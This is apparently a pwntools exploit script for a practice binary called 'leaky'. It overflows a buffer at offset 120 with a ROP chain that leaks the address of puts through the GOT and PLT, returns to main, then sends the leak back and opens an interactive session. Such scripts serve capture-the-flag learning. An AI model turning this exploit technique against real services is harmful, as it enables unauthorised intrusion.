#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/leaky'

e = ELF('./build/leaky')
rop = ROP('./build/leaky')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5500)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/leaky', cwd='problemDir')
else:
    p = e.process()

#payload = flat({120: rop.find_gadget(['ret'])[0]}, rop.find_gadget(['pop rdi','ret'])[0],e.got['puts'],e.plt['puts'],e.sym['main'])
payload = flat({120: rop.find_gadget(['pop rdi','ret'])[0]},e.got['puts'],e.plt['puts'],e.sym['main'])

p.sendline(b'123')
p.sendline(payload)
p.recvline()
puts = p.recvline()[:-1]
while len(puts) < 8:
    puts = puts + b"\x00"
print(puts)
puts = u64(puts)
p.sendline(str(puts))
p.interactive()
